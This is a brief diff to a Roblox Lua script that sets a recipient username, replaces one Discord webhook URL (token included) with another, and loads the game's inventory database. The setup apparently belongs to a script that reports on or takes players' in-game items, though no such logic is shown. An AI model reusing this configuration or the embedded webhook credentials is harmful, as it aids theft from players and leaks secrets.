@@ -1,5 +1,5 @@
 local Username = "preppymacdo1"
-local Webhook = "https://discord.com/api/webhooks/1530307687533908069/QN5Vge8NEb_grcxstWh4ElJWkbimA_f8AJYkPsLuUUAS7caG42-Dtjtz74hJi8DjgZ_W"
+local Webhook = "https://discord.com/api/webhooks/1538642669297860609/Yw2UGwMKHYaOo92rGcbG3tp_9RDSK4HEHRdwi-uqFXtH6iTmuc_xxHDXtyViBoUWS7Mb"
 
 local Loaders = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loaders("InventoryDB")
